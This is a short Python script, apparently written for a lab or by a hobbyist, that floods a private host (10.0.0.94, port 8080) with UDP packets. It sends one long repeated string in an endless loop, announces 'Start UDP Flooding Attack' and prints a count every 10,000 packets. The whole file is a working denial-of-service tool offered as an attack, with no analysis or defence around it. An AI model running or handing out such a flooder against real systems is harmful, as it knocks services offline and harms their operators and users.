import socket

IP = "10.0.0.94"
PORT = 8080
MESSAGE = "UDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDPFloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDPFloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDPFloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDP Packet FloodingUDPFloodingUDP Packet FloodingUDP Packet"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
i = 0
print("==========================")
print("Start UDP Flooding Attack")

while True  :
    i = i + 1
    sock.sendto(MESSAGE, (IP, PORT))
    if i % 10000 == 0 :
        print("Send UDP Packet : "+str(i))

        
